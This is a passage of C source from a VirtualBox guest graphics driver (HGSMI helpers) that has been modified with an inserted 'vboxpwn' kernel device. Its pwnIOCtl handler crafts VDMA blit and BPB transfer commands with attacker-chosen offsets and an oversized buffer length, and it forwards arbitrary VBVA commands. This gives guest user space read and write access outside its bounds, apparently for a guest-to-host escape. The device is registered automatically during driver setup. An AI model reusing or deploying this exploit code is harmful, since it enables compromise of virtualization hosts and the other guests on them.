        if (RT_SUCCESS(rc))
        {
            AssertRC(pCaps->rc);
            rc = pCaps->rc;
        }
        /* Free the IO buffer. */
        VBoxHGSMIBufferFree(pCtx, pCaps);
    }
    else
        rc = VERR_NO_MEMORY;
    return rc;
}

/**
 * Notify the host of HGSMI-related guest capabilities via an HGSMI command.
 * @returns  IPRT status value.
 * @returns  VERR_NOT_IMPLEMENTED  if the host does not support the command.
 * @returns  VERR_NO_MEMORY        if a heap allocation fails.
 * @param    pCtx                  the context of the guest heap to use.
 * @param    fCaps                 the capabilities to report, see VBVACAPS.
 */
DECLHIDDEN(int) VBoxHGSMISendCapsInfo(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                      uint32_t fCaps)
{
    return vboxHGSMISendCapsInfo(pCtx, fCaps);
}

/** Tell the host about the location of the area of VRAM set aside for the host
 * heap. */
static int vboxHGSMIReportHostArea(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                   uint32_t u32AreaOffset, uint32_t u32AreaSize)
{
    VBVAINFOHEAP *p;
    int rc = VINF_SUCCESS;

    /* Allocate the IO buffer. */
    p = (VBVAINFOHEAP *)VBoxHGSMIBufferAlloc(pCtx,
                                       sizeof (VBVAINFOHEAP), HGSMI_CH_VBVA,
                                       VBVA_INFO_HEAP);
    if (p)
    {
        /* Prepare data to be sent to the host. */
        p->u32HeapOffset = u32AreaOffset;
        p->u32HeapSize   = u32AreaSize;
        rc = VBoxHGSMIBufferSubmit(pCtx, p);
        /* Free the IO buffer. */
        VBoxHGSMIBufferFree(pCtx, p);
    }
    else
        rc = VERR_NO_MEMORY;
    return rc;
}

/**
 * Get the information needed to map the basic communication structures in
 * device memory into our address space.  All pointer parameters are optional.
 *
 * @param  cbVRAM               how much video RAM is allocated to the device
 * @param  poffVRAMBaseMapping  where to save the offset from the start of the
 *                              device VRAM of the whole area to map
 * @param  pcbMapping           where to save the mapping size
 * @param  poffGuestHeapMemory  where to save the offset into the mapped area
 *                              of the guest heap backing memory
 * @param  pcbGuestHeapMemory   where to save the size of the guest heap
 *                              backing memory
 * @param  poffHostFlags        where to save the offset into the mapped area
 *                              of the host flags
 */
DECLHIDDEN(void) VBoxHGSMIGetBaseMappingInfo(uint32_t cbVRAM,
                                             uint32_t *poffVRAMBaseMapping,
                                             uint32_t *pcbMapping,
                                             uint32_t *poffGuestHeapMemory,
                                             uint32_t *pcbGuestHeapMemory,
                                             uint32_t *poffHostFlags)
{
    AssertPtrNullReturnVoid(poffVRAMBaseMapping);
    AssertPtrNullReturnVoid(pcbMapping);
    AssertPtrNullReturnVoid(poffGuestHeapMemory);
    AssertPtrNullReturnVoid(pcbGuestHeapMemory);
    AssertPtrNullReturnVoid(poffHostFlags);
    if (poffVRAMBaseMapping)
        *poffVRAMBaseMapping = cbVRAM - VBVA_ADAPTER_INFORMATION_SIZE;
    if (pcbMapping)
        *pcbMapping = VBVA_ADAPTER_INFORMATION_SIZE;
    if (poffGuestHeapMemory)
        *poffGuestHeapMemory = 0;
    if (pcbGuestHeapMemory)
        *pcbGuestHeapMemory =   VBVA_ADAPTER_INFORMATION_SIZE
                              - sizeof(HGSMIHOSTFLAGS);
    if (poffHostFlags)
        *poffHostFlags =   VBVA_ADAPTER_INFORMATION_SIZE
                         - sizeof(HGSMIHOSTFLAGS);
}

typedef struct VBOXVDMACBUF_DR
{
    uint16_t fFlags;
    uint16_t cbBuf;
    /* RT_SUCCESS()     - on success
     * VERR_INTERRUPTED - on preemption
     * VERR_xxx         - on error */
    int32_t  rc;
    union
    {
        uint64_t phBuf;
        VBOXVIDEOOFFSET offVramBuf;
    } Location;
    uint64_t aGuestData[7];
} VBOXVDMACBUF_DR, *PVBOXVDMACBUF_DR;

typedef struct VBOXVDMACMD
{
    VBOXVDMACMD_TYPE enmType;
    uint32_t u32CmdSpecific;
} VBOXVDMACMD, *PVBOXVDMACMD;

// Data structures for BPB_TRANSFER
typedef struct VBOXVDMACMD_DMA_BPB_TRANSFER
{
    uint32_t cbTransferSize;
    uint32_t fFlags;
    union
    {
        uint64_t phBuf;
        VBOXVIDEOOFFSET offVramBuf;
    } Src;
    union
    {
        uint64_t phBuf;
        VBOXVIDEOOFFSET offVramBuf;
    } Dst;
} VBOXVDMACMD_DMA_BPB_TRANSFER, *PVBOXVDMACMD_DMA_BPB_TRANSFER;

// Data structures for PRESENT_BLT
typedef enum
{
    VBOXVDMA_PIXEL_FORMAT_UNKNOWN      =  0,
    VBOXVDMA_PIXEL_FORMAT_R8G8B8       = 20,
    VBOXVDMA_PIXEL_FORMAT_A8R8G8B8     = 21,
    VBOXVDMA_PIXEL_FORMAT_X8R8G8B8     = 22,
    VBOXVDMA_PIXEL_FORMAT_R5G6B5       = 23,
    VBOXVDMA_PIXEL_FORMAT_X1R5G5B5     = 24,
    VBOXVDMA_PIXEL_FORMAT_A1R5G5B5     = 25,
    VBOXVDMA_PIXEL_FORMAT_A4R4G4B4     = 26,
    VBOXVDMA_PIXEL_FORMAT_R3G3B2       = 27,
    VBOXVDMA_PIXEL_FORMAT_A8           = 28,
    VBOXVDMA_PIXEL_FORMAT_A8R3G3B2     = 29,
    VBOXVDMA_PIXEL_FORMAT_X4R4G4B4     = 30,
    VBOXVDMA_PIXEL_FORMAT_A2B10G10R10  = 31,
    VBOXVDMA_PIXEL_FORMAT_A8B8G8R8     = 32,
    VBOXVDMA_PIXEL_FORMAT_X8B8G8R8     = 33,
    VBOXVDMA_PIXEL_FORMAT_G16R16       = 34,
    VBOXVDMA_PIXEL_FORMAT_A2R10G10B10  = 35,
    VBOXVDMA_PIXEL_FORMAT_A16B16G16R16 = 36,
    VBOXVDMA_PIXEL_FORMAT_A8P8         = 40,
    VBOXVDMA_PIXEL_FORMAT_P8           = 41,
    VBOXVDMA_PIXEL_FORMAT_L8           = 50,
    VBOXVDMA_PIXEL_FORMAT_A8L8         = 51,
    VBOXVDMA_PIXEL_FORMAT_A4L4         = 52,
    VBOXVDMA_PIXEL_FORMAT_V8U8         = 60,
    VBOXVDMA_PIXEL_FORMAT_L6V5U5       = 61,
    VBOXVDMA_PIXEL_FORMAT_X8L8V8U8     = 62,
    VBOXVDMA_PIXEL_FORMAT_Q8W8V8U8     = 63,
    VBOXVDMA_PIXEL_FORMAT_V16U16       = 64,
    VBOXVDMA_PIXEL_FORMAT_W11V11U10    = 65,
    VBOXVDMA_PIXEL_FORMAT_A2W10V10U10  = 67
} VBOXVDMA_PIXEL_FORMAT;

typedef struct VBOXVDMA_SURF_DESC
{
    uint32_t width;
    uint32_t height;
    VBOXVDMA_PIXEL_FORMAT format;
    uint32_t bpp;
    uint32_t pitch;
    uint32_t fFlags;
} VBOXVDMA_SURF_DESC, *PVBOXVDMA_SURF_DESC;

typedef struct VBOXVDMA_RECTL
{
    int16_t left;
    int16_t top;
    uint16_t width;
    uint16_t height;
} VBOXVDMA_RECTL, *PVBOXVDMA_RECTL;

typedef struct VBOXVDMACMD_DMA_PRESENT_BLT
{
    VBOXVIDEOOFFSET offSrc;
    VBOXVIDEOOFFSET offDst;
    VBOXVDMA_SURF_DESC srcDesc;
    VBOXVDMA_SURF_DESC dstDesc;
    VBOXVDMA_RECTL srcRectl;
    VBOXVDMA_RECTL dstRectl;
    uint32_t u32Reserved;
    uint32_t cDstSubRects;
    VBOXVDMA_RECTL aDstSubRects[1];
} VBOXVDMACMD_DMA_PRESENT_BLT, *PVBOXVDMACMD_DMA_PRESENT_BLT;

PHGSMIGUESTCOMMANDCONTEXT g_hgsmiContext;
char* g_vram;

typedef struct PwnRequest {
    uint32_t type;   // 1/4 == read, 2/5 == write, 3 == custom VBVA command,
                     // 6 == get VRAM size
    uint32_t size;
    uint64_t offset;
    char data[1];
} PwnRequest;

static long pwnIOCtl(struct file *pFilp, unsigned int uCmd, unsigned long ulArg) {
    printk("Handling ioctl()\n");
    uint32_t size = uCmd;
    PwnRequest* req = (PwnRequest*)ulArg;

    if (size < 16) {
        printk("Request buffer too small (is=%d)\n", size);
        return -EINVAL;
    }

    if (req->type == 1) {
        char *p;
        printk("Preparing VMDA command for reading %u bytes (offset=%lu).\n", req->size, req->offset);

        uint32_t header_size =
            32 +
            sizeof(VBOXVDMACBUF_DR) +
            sizeof(VBOXVDMACMD) +
            sizeof(VBOXVDMACMD_DMA_PRESENT_BLT);

        p = (char *)VBoxHGSMIBufferAlloc(g_hgsmiContext,
                                         header_size + req->size,
                                         HGSMI_CH_VBVA,
                                         11 /*VBVA_VDMA_CMD*/);
        if (!p) {
            printk("Failed to allocate HGSMI memory\n");
            return -ENOMEM;
        }

        memset(p + header_size, 0x41, req->size);

        PVBOXVDMACBUF_DR pCmd = (PVBOXVDMACBUF_DR)(p+32);
        pCmd->fFlags = 2/*VBOXVDMACBUF_FLAG_BUF_FOLLOWS_DR*/;
        pCmd->cbBuf = 0xffff;

        PVBOXVDMACMD pDmaCmd = (PVBOXVDMACMD)((char*)pCmd + sizeof(VBOXVDMACBUF_DR));
        pDmaCmd->enmType = 1 /* VBOXVDMACMD_TYPE_DMA_PRESENT_BLT */;

        PVBOXVDMACMD_DMA_PRESENT_BLT pBlt = (PVBOXVDMACMD_DMA_PRESENT_BLT)((char*)pDmaCmd + sizeof(VBOXVDMACMD));
        pBlt->cDstSubRects = 0;
        pBlt->offSrc = req->offset;
        pBlt->offDst = p - g_vram + header_size;

        pBlt->srcRectl.width = 1;
        pBlt->srcRectl.height = req->size;
        pBlt->srcRectl.left = 0;
        pBlt->srcRectl.top = 0;

        pBlt->dstRectl.width = 1;
        pBlt->dstRectl.height = req->size;
        pBlt->dstRectl.left = 0;
        pBlt->dstRectl.top = 0;

        pBlt->srcDesc.width = 1;
        pBlt->srcDesc.height = req->size;
        pBlt->srcDesc.format = 20 /*VBOXVDMA_PIXEL_FORMAT_R8G8B8*/;
        pBlt->srcDesc.bpp = 1;
        pBlt->srcDesc.pitch = 1;
        pBlt->srcDesc.fFlags = 0;

        pBlt->dstDesc.width = 1;
        pBlt->dstDesc.height = req->size;
        pBlt->dstDesc.format = 20 /*VBOXVDMA_PIXEL_FORMAT_R8G8B8*/;
        pBlt->dstDesc.bpp = 1;
        pBlt->dstDesc.pitch = 1;
        pBlt->dstDesc.fFlags = 0;

        int rc = VBoxHGSMIBufferSubmit(g_hgsmiContext, p);
        VBoxHGSMIBufferFree(g_hgsmiContext, p);
        if (RT_FAILURE(rc)) {
            printk("Error while sending VMDA command: %d\n", rc);
            return -EFAULT;
        }

        memcpy(req->data, p+header_size, req->size);
    } else if (req->type == 2) {
        char *p;
        printk("Preparing VMDA command for writing %u bytes (offset=%lu).\n", req->size, req->offset);

        uint32_t header_size =
            32 +
            sizeof(VBOXVDMACBUF_DR) +
            sizeof(VBOXVDMACMD) +
            sizeof(VBOXVDMACMD_DMA_PRESENT_BLT);

        p = (char *)VBoxHGSMIBufferAlloc(g_hgsmiContext,
                                         header_size + req->size,
                                         HGSMI_CH_VBVA,
                                         11 /*VBVA_VDMA_CMD*/);
        if (!p) {
            printk("Failed to allocate HGSMI memory\n");
            return -ENOMEM;
        }

        memcpy(p + header_size, req->data, req->size);

        PVBOXVDMACBUF_DR pCmd = (PVBOXVDMACBUF_DR)(p+32);
        pCmd->fFlags = 2/*VBOXVDMACBUF_FLAG_BUF_FOLLOWS_DR*/;
        pCmd->cbBuf = 0xffff;

        PVBOXVDMACMD pDmaCmd = (PVBOXVDMACMD)((char*)pCmd + sizeof(VBOXVDMACBUF_DR));
        pDmaCmd->enmType = 1 /* VBOXVDMACMD_TYPE_DMA_PRESENT_BLT */;

        PVBOXVDMACMD_DMA_PRESENT_BLT pBlt = (PVBOXVDMACMD_DMA_PRESENT_BLT)((char*)pDmaCmd + sizeof(VBOXVDMACMD));
        pBlt->cDstSubRects = 0;
        pBlt->offSrc = p - g_vram + header_size;
        pBlt->offDst = req->offset;

        pBlt->srcRectl.width = 1;
        pBlt->srcRectl.height = req->size;
        pBlt->srcRectl.left = 0;
        pBlt->srcRectl.top = 0;

        pBlt->dstRectl.width = 1;
        pBlt->dstRectl.height = req->size;
        pBlt->dstRectl.left = 0;
        pBlt->dstRectl.top = 0;

        pBlt->srcDesc.width = 1;
        pBlt->srcDesc.height = req->size;
        pBlt->srcDesc.format = 20 /*VBOXVDMA_PIXEL_FORMAT_R8G8B8*/;
        pBlt->srcDesc.bpp = 1;
        pBlt->srcDesc.pitch = 1;
        pBlt->srcDesc.fFlags = 0;

        pBlt->dstDesc.width = 1;
        pBlt->dstDesc.height = req->size;
        pBlt->dstDesc.format = 20 /*VBOXVDMA_PIXEL_FORMAT_R8G8B8*/;
        pBlt->dstDesc.bpp = 1;
        pBlt->dstDesc.pitch = 1;
        pBlt->dstDesc.fFlags = 0;

        int rc = VBoxHGSMIBufferSubmit(g_hgsmiContext, p);
        VBoxHGSMIBufferFree(g_hgsmiContext, p);
        if (RT_FAILURE(rc)) {
            printk("Error while sending VMDA command: %d\n", rc);
            return -EFAULT;
        }
    } else if (req->type == 3) {
        char *p;
        printk("Sending custom VBVA command (size=%u).\n", req->size);

        p = (char *)VBoxHGSMIBufferAlloc(g_hgsmiContext,
                                         req->size,
                                         HGSMI_CH_VBVA,
                                         req->offset);
        if (!p) {
            printk("Failed to allocate HGSMI memory\n");
            return -ENOMEM;
        }

        memcpy(p, req->data, req->size);

        int rc = VBoxHGSMIBufferSubmit(g_hgsmiContext, p);
        VBoxHGSMIBufferFree(g_hgsmiContext, p);
        if (RT_FAILURE(rc)) {
            printk("Error while sending VBVA command: %d\n", rc);
            return -EFAULT;
        }
    } else if (req->type == 4) {
        char *p;
        printk("Preparing BpbTransfer command for reading %u bytes (offset=%llu).\n", req->size, req->offset);

        uint32_t header_size =
            32 +
            sizeof(VBOXVDMACBUF_DR) +
            sizeof(VBOXVDMACMD) +
            sizeof(VBOXVDMACMD_DMA_BPB_TRANSFER);

        p = (char *)VBoxHGSMIBufferAlloc(g_hgsmiContext,
                                         header_size + req->size,
                                         HGSMI_CH_VBVA,
                                         11 /*VBVA_VDMA_CMD*/);
        if (!p) {
            printk("Failed to allocate HGSMI memory\n");
            return -ENOMEM;
        }

        memset(p + header_size, 0x41, req->size);

        PVBOXVDMACBUF_DR pCmd = (PVBOXVDMACBUF_DR)(p+32);
        pCmd->fFlags = 2/*VBOXVDMACBUF_FLAG_BUF_FOLLOWS_DR*/;
        pCmd->cbBuf = 0xffff;

        PVBOXVDMACMD pDmaCmd = (PVBOXVDMACMD)((char*)pCmd + sizeof(VBOXVDMACBUF_DR));
        pDmaCmd->enmType = 2 /* VBOXVDMACMD_TYPE_DMA_BPB_TRANSFER */;

        PVBOXVDMACMD_DMA_BPB_TRANSFER pBpb = (PVBOXVDMACMD_DMA_BPB_TRANSFER)((char*)pDmaCmd + sizeof(VBOXVDMACMD));
        pBpb->cbTransferSize = req->size;
        pBpb->fFlags = 3;
        pBpb->Src.offVramBuf = req->offset;
        pBpb->Dst.offVramBuf = p - g_vram + header_size;

        int rc = VBoxHGSMIBufferSubmit(g_hgsmiContext, p);
        VBoxHGSMIBufferFree(g_hgsmiContext, p);
        if (RT_FAILURE(rc)) {
            printk("Error while sending VDMA command: %d\n", rc);
            return -EFAULT;
        }

        memcpy(req->data, p+header_size, req->size);
    } else if (req->type == 5) {
        char *p;
        printk("Preparing BpbTransfer command for writing %u bytes (offset=%llu).\n", req->size, req->offset);

        uint32_t header_size =
            32 +
            sizeof(VBOXVDMACBUF_DR) +
            sizeof(VBOXVDMACMD) +
            sizeof(VBOXVDMACMD_DMA_BPB_TRANSFER);

        p = (char *)VBoxHGSMIBufferAlloc(g_hgsmiContext,
                                         header_size + req->size,
                                         HGSMI_CH_VBVA,
                                         11 /*VBVA_VDMA_CMD*/);
        if (!p) {
            printk("Failed to allocate HGSMI memory\n");
            return -ENOMEM;
        }

        memcpy(p + header_size, req->data, req->size);

        PVBOXVDMACBUF_DR pCmd = (PVBOXVDMACBUF_DR)(p+32);
        pCmd->fFlags = 2/*VBOXVDMACBUF_FLAG_BUF_FOLLOWS_DR*/;
        pCmd->cbBuf = 0xffff;

        PVBOXVDMACMD pDmaCmd = (PVBOXVDMACMD)((char*)pCmd + sizeof(VBOXVDMACBUF_DR));
        pDmaCmd->enmType = 2 /* VBOXVDMACMD_TYPE_DMA_BPB_TRANSFER */;

        PVBOXVDMACMD_DMA_BPB_TRANSFER pBpb = (PVBOXVDMACMD_DMA_BPB_TRANSFER)((char*)pDmaCmd + sizeof(VBOXVDMACMD));
        pBpb->cbTransferSize = req->size;
        pBpb->fFlags = 3;
        pBpb->Dst.offVramBuf = req->offset;
        pBpb->Src.offVramBuf = p - g_vram + header_size;

        int rc = VBoxHGSMIBufferSubmit(g_hgsmiContext, p);
        VBoxHGSMIBufferFree(g_hgsmiContext, p);
        if (RT_FAILURE(rc)) {
            printk("Error while sending VDMA command: %d\n", rc);
            return -EFAULT;
        }

        memcpy(req->data, p+header_size, req->size);
    } else if (req->type == 6) {
        printk("Getting VRAM size\n");
        uint32_t vram_size = VBoxVideoCmnPortReadUlong(VBE_DISPI_IOPORT_DATA);
        memcpy(req->data, &vram_size, sizeof vram_size);
    } else {
        printk("Unknown request type: %d\n", req->type);
        return -EFAULT;
    }

    return 0;
}

static struct file_operations   g_PwnFileOps =
{
    owner:          THIS_MODULE,
    unlocked_ioctl: pwnIOCtl,
};

static struct miscdevice        g_PwnDevice =
{
    minor:          MISC_DYNAMIC_MINOR,
    name:           "vboxpwn",
    fops:           &g_PwnFileOps,
};

/**
 * Set up the HGSMI guest-to-host command context.
 * @returns iprt status value
 * @param  pCtx                    the context to set up
 * @param  pvGuestHeapMemory       a pointer to the mapped backing memory for
 *                                 the guest heap
 * @param  cbGuestHeapMemory       the size of the backing memory area
 * @param  offVRAMGuestHeapMemory  the offset of the memory pointed to by
 *                                 @a pvGuestHeapMemory within the video RAM
 */
DECLHIDDEN(int) VBoxHGSMISetupGuestContext(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                           void *pvGuestHeapMemory,
                                           uint32_t cbGuestHeapMemory,
                                           uint32_t offVRAMGuestHeapMemory,
                                           const HGSMIENV *pEnv)
{
    g_vram = (char*)pvGuestHeapMemory - offVRAMGuestHeapMemory;
    g_hgsmiContext = pCtx;
    printk("Registering device node. VRAM @ 0x%016lx\n", g_vram);
    if (!misc_register(&g_PwnDevice)) {
        printk("Successfully created pwn device.\n");
    } else {
        printk("Error creating pwn device.\n");
    }

    /** @todo should we be using a fixed ISA port value here? */
    pCtx->port = (RTIOPORT)VGA_PORT_HGSMI_GUEST;
#ifdef VBOX_WDDM_MINIPORT
    return VBoxSHGSMIInit(&pCtx->heapCtx, pvGuestHeapMemory,
                          cbGuestHeapMemory, offVRAMGuestHeapMemory, pEnv);
#else
    return HGSMIHeapSetup(&pCtx->heapCtx, pvGuestHeapMemory,
                          cbGuestHeapMemory, offVRAMGuestHeapMemory, pEnv);
#endif
}

/**
 * Get the information needed to map the area used by the host to send back
 * requests.
 *
 * @param  pCtx                the context containing the heap to use
 * @param  cbVRAM              how much video RAM is allocated to the device
 * @param  offVRAMBaseMapping  the offset of the basic communication structures
 *                             into the guest's VRAM
 * @param  poffVRAMHostArea    where to store the offset into VRAM of the host
 *                             heap area
 * @param  pcbHostArea         where to store the size of the host heap area
 */
DECLHIDDEN(void) VBoxHGSMIGetHostAreaMapping(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                             uint32_t cbVRAM,
                                             uint32_t offVRAMBaseMapping,
                                             uint32_t *poffVRAMHostArea,
                                             uint32_t *pcbHostArea)
{
    uint32_t offVRAMHostArea = offVRAMBaseMapping, cbHostArea = 0;

    AssertPtrReturnVoid(poffVRAMHostArea);
    AssertPtrReturnVoid(pcbHostArea);
    VBoxQueryConfHGSMI(pCtx, VBOX_VBVA_CONF32_HOST_HEAP_SIZE, &cbHostArea);
    if (cbHostArea != 0)
    {
        uint32_t cbHostAreaMaxSize = cbVRAM / 4;
        /** @todo what is the idea of this? */
        if (cbHostAreaMaxSize >= VBVA_ADAPTER_INFORMATION_SIZE)
        {
            cbHostAreaMaxSize -= VBVA_ADAPTER_INFORMATION_SIZE;
        }
        if (cbHostArea > cbHostAreaMaxSize)
        {
            cbHostArea = cbHostAreaMaxSize;
        }
        /* Round up to 4096 bytes. */
        cbHostArea = (cbHostArea + 0xFFF) & ~0xFFF;
        offVRAMHostArea = offVRAMBaseMapping - cbHostArea;
    }

    *pcbHostArea = cbHostArea;
    *poffVRAMHostArea = offVRAMHostArea;
    LogFunc(("offVRAMHostArea = 0x%08X, cbHostArea = 0x%08X\n",
             offVRAMHostArea, cbHostArea));
}

/**
 * Initialise the host context structure.
 *
 * @param  pCtx               the context structure to initialise
 * @param  pvBaseMapping      where the basic HGSMI structures are mapped at
 * @param  offHostFlags       the offset of the host flags into the basic HGSMI
 *                            structures
 * @param  pvHostAreaMapping  where the area for the host heap is mapped at
 * @param  offVRAMHostArea    offset of the host heap area into VRAM
 * @param  cbHostArea         size in bytes of the host heap area
 */
DECLHIDDEN(void) VBoxHGSMISetupHostContext(PHGSMIHOSTCOMMANDCONTEXT pCtx,
                                           void *pvBaseMapping,
                                           uint32_t offHostFlags,
                                           void *pvHostAreaMapping,
                                           uint32_t offVRAMHostArea,
                                           uint32_t cbHostArea)
{
    uint8_t *pu8HostFlags = ((uint8_t *)pvBaseMapping) + offHostFlags;
    pCtx->pfHostFlags = (HGSMIHOSTFLAGS *)pu8HostFlags;
    /** @todo should we really be using a fixed ISA port value here? */
    pCtx->port        = (RTIOPORT)VGA_PORT_HGSMI_HOST;
    HGSMIAreaInitialize(&pCtx->areaCtx, pvHostAreaMapping, cbHostArea,
                         offVRAMHostArea);
}

/**
 * Tell the host about the ways it can use to communicate back to us via an
 * HGSMI command
 *
 * @returns  iprt status value
 * @param  pCtx                  the context containing the heap to use
 * @param  offVRAMFlagsLocation  where we wish the host to place its flags
 *                               relative to the start of the VRAM
 * @param  fCaps                 additions HGSMI capabilities the guest
 *                               supports
 * @param  offVRAMHostArea       offset into VRAM of the host heap area
 * @param  cbHostArea            size in bytes of the host heap area
 */
DECLHIDDEN(int) VBoxHGSMISendHostCtxInfo(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                         HGSMIOFFSET offVRAMFlagsLocation,
                                         uint32_t fCaps,
                                         uint32_t offVRAMHostArea,
                                         uint32_t cbHostArea)
{
    Log(("VBoxVideo::vboxSetupAdapterInfo\n"));

    /* setup the flags first to ensure they are initialized by the time the
     * host heap is ready */
    int rc = vboxHGSMIReportFlagsLocation(pCtx, offVRAMFlagsLocation);
    AssertRC(rc);
    if (RT_SUCCESS(rc) && fCaps)
    {
        /* Inform about caps */
        rc = vboxHGSMISendCapsInfo(pCtx, fCaps);
        AssertRC(rc);
    }
    if (RT_SUCCESS (rc))
    {
        /* Report the host heap location. */
        rc = vboxHGSMIReportHostArea(pCtx, offVRAMHostArea, cbHostArea);
        AssertRC(rc);
    }
    Log(("VBoxVideo::vboxSetupAdapterInfo finished rc = %d\n", rc));
    return rc;
}

/** Sanity test on first call.  We do not worry about concurrency issues. */
static int testQueryConf(PHGSMIGUESTCOMMANDCONTEXT pCtx)
{
    static bool cOnce = false;
    uint32_t ulValue = 0;
    int rc;

    if (cOnce)
        return VINF_SUCCESS;
    cOnce = true;
    rc = VBoxQueryConfHGSMI(pCtx, UINT32_MAX, &ulValue);
    if (RT_SUCCESS(rc) && ulValue == UINT32_MAX)
        return VINF_SUCCESS;
    cOnce = false;
    if (RT_FAILURE(rc))
        return rc;
    return VERR_INTERNAL_ERROR;
}

/**
 * Query the host for an HGSMI configuration parameter via an HGSMI command.
 * @returns iprt status value
 * @param  pCtx      the context containing the heap used
 * @param  u32Index  the index of the parameter to query,
 *                   @see VBVACONF32::u32Index
 * @param  u32DefValue defaut value
 * @param  pulValue  where to store the value of the parameter on success
 */
DECLHIDDEN(int) VBoxQueryConfHGSMIDef(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                      uint32_t u32Index, uint32_t u32DefValue, uint32_t *pulValue)
{
    int rc = VINF_SUCCESS;
    VBVACONF32 *p;
    LogFunc(("u32Index = %d\n", u32Index));

    rc = testQueryConf(pCtx);
    if (RT_FAILURE(rc))
        return rc;
    /* Allocate the IO buffer. */
    p = (VBVACONF32 *)VBoxHGSMIBufferAlloc(pCtx,
                                     sizeof(VBVACONF32), HGSMI_CH_VBVA,
                                     VBVA_QUERY_CONF32);
    if (p)
    {
        /* Prepare data to be sent to the host. */
        p->u32Index = u32Index;
        p->u32Value = u32DefValue;
        rc = VBoxHGSMIBufferSubmit(pCtx, p);
        if (RT_SUCCESS(rc))
        {
            *pulValue = p->u32Value;
            LogFunc(("u32Value = %d\n", p->u32Value));
        }
        /* Free the IO buffer. */
        VBoxHGSMIBufferFree(pCtx, p);
    }
    else
        rc = VERR_NO_MEMORY;
    LogFunc(("rc = %d\n", rc));
    return rc;
}

DECLHIDDEN(int) VBoxQueryConfHGSMI(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                   uint32_t u32Index, uint32_t *pulValue)
{
    return VBoxQueryConfHGSMIDef(pCtx, u32Index, UINT32_MAX, pulValue);
}

/**
 * Pass the host a new mouse pointer shape via an HGSMI command.
 *
 * @returns  success or failure
 * @param  fFlags    cursor flags, @see VMMDevReqMousePointer::fFlags
 * @param  cHotX     horizontal position of the hot spot
 * @param  cHotY     vertical position of the hot spot
 * @param  cWidth    width in pixels of the cursor
 * @param  cHeight   height in pixels of the cursor
 * @param  pPixels   pixel data, @see VMMDevReqMousePointer for the format
 * @param  cbLength  size in bytes of the pixel data
 */
DECLHIDDEN(int)  VBoxHGSMIUpdatePointerShape(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                             uint32_t fFlags,
                                             uint32_t cHotX,
                                             uint32_t cHotY,
                                             uint32_t cWidth,
                                             uint32_t cHeight,
                                             uint8_t *pPixels,
                                             uint32_t cbLength)
{
    VBVAMOUSEPOINTERSHAPE *p;
    uint32_t cbData = 0;
    int rc = VINF_SUCCESS;

    if (fFlags & VBOX_MOUSE_POINTER_SHAPE)
    {
        /* Size of the pointer data: sizeof (AND mask) + sizeof (XOR_MASK) */
        cbData = ((((cWidth + 7) / 8) * cHeight + 3) & ~3)
                 + cWidth * 4 * cHeight;
        /* If shape is supplied, then always create the pointer visible.
         * See comments in 'vboxUpdatePointerShape'
         */
        fFlags |= VBOX_MOUSE_POINTER_VISIBLE;
    }
    LogFlowFunc(("cbData %d, %dx%d\n", cbData, cWidth, cHeight));
    if (cbData > cbLength)
    {
        LogFunc(("calculated pointer data size is too big (%d bytes, limit %d)\n",
                 cbData, cbLength));
        return VERR_INVALID_PARAMETER;
    }
    /* Allocate the IO buffer. */
    p = (VBVAMOUSEPOINTERSHAPE *)VBoxHGSMIBufferAlloc(pCtx,
                                                  sizeof(VBVAMOUSEPOINTERSHAPE)
                                                + cbData,
                                                HGSMI_CH_VBVA,
                                                VBVA_MOUSE_POINTER_SHAPE);
    if (p)
    {
        /* Prepare data to be sent to the host. */
        /* Will be updated by the host. */
        p->i32Result = VINF_SUCCESS;
        /* We have our custom flags in the field */
        p->fu32Flags = fFlags;
        p->u32HotX   = cHotX;
        p->u32HotY   = cHotY;
        p->u32Width  = cWidth;
        p->u32Height = cHeight;
        if (p->fu32Flags & VBOX_MOUSE_POINTER_SHAPE)
            /* Copy the actual pointer data. */
            memcpy (p->au8Data, pPixels, cbData);
        rc = VBoxHGSMIBufferSubmit(pCtx, p);
        if (RT_SUCCESS(rc))
            rc = p->i32Result;
        /* Free the IO buffer. */
        VBoxHGSMIBufferFree(pCtx, p);
    }
    else
        rc = VERR_NO_MEMORY;
    LogFlowFunc(("rc %d\n", rc));
    return rc;
}

/**
 * Report the guest cursor position.  The host may wish to use this information
 * to re-position its own cursor (though this is currently unlikely).  The
 * current host cursor position is returned.
 * @param  pCtx             The context containing the heap used.
 * @param  fReportPosition  Are we reporting a position?
 * @param  x                Guest cursor X position.
 * @param  y                Guest cursor Y position.
 * @param  pxHost           Host cursor X position is stored here.  Optional.
 * @param  pyHost           Host cursor Y position is stored here.  Optional.
 * @returns  iprt status code.
 * @returns  VERR_NO_MEMORY      HGSMI heap allocation failed.
 */
DECLHIDDEN(int) VBoxHGSMICursorPosition(PHGSMIGUESTCOMMANDCONTEXT pCtx, bool fReportPosition, uint32_t x, uint32_t y,
                                        uint32_t *pxHost, uint32_t *pyHost)
{
    int rc = VINF_SUCCESS;
    VBVACURSORPOSITION *p;
    Log(("%s: x=%u, y=%u\n", __PRETTY_FUNCTION__, (unsigned)x, (unsigned)y));

    /* Allocate the IO buffer. */
    p = (VBVACURSORPOSITION *)VBoxHGSMIBufferAlloc(pCtx, sizeof(VBVACURSORPOSITION), HGSMI_CH_VBVA, VBVA_CURSOR_POSITION);
    if (p)
    {
        /* Prepare data to be sent to the host. */
        p->fReportPosition = fReportPosition ? 1 : 0;
        p->x = x;
        p->y = y;
        rc = VBoxHGSMIBufferSubmit(pCtx, p);
        if (RT_SUCCESS(rc))
        {
            if (pxHost)
                *pxHost = p->x;
            if (pyHost)
                *pyHost = p->y;
            Log(("%s: return: x=%u, y=%u\n", __PRETTY_FUNCTION__, (unsigned)p->x, (unsigned)p->y));
        }
        /* Free the IO buffer. */
        VBoxHGSMIBufferFree(pCtx, p);
    }
    else
        rc = VERR_NO_MEMORY;
    LogFunc(("rc = %d\n", rc));
    return rc;
}

/** @todo Mouse pointer position to be read from VMMDev memory, address of the memory region
 * can be queried from VMMDev via an IOCTL. This VMMDev memory region will contain
 * host information which is needed by the guest.
 *
 * Reading will not cause a switch to the host.
 *
 * Have to take into account:
 *  * synchronization: host must write to the memory only from EMT,
 *    large structures must be read under flag, which tells the host
